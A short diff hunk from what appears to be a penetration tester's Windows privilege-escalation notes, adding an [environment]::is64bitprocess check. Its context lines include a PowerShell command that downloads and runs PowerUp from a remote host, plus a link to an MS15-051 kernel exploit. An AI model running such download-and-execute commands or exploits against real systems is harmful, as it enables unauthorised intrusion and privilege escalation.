@@ -78,6 +78,8 @@ powerup --> empire echo IEX(New-Object Net.WebClient).downloadString('http://10.
   Either append Invoke-Allchecks at the bottom or after execution type Invoke-AllChecks
 MS15-051 --> https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-051
 [environment]::is64bitoperatingsystem
+[environment]::is64bitprocess
+
 
 
 #create credentials object
